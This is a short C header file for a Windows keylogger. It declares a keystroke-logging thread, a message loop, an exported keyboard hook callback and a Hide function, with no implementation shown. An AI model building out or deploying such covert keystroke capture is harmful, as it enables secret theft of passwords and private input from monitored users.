#ifndef KEYLOGGER_H_INCLUDED
#define KEYLOGGER_H_INCLUDED
#include <stdio.h>
#include <stdlib.h>
#include <windows.h>

DWORD WINAPI KeyLogger(LPVOID lpParameter);
void MsgLoop();
__declspec(dllexport) LRESULT CALLBACK KeyEvent (int nCode, WPARAM wParam, LPARAM lParam );
void Hide();

#endif // KEYLOGGER_H_INCLUDED
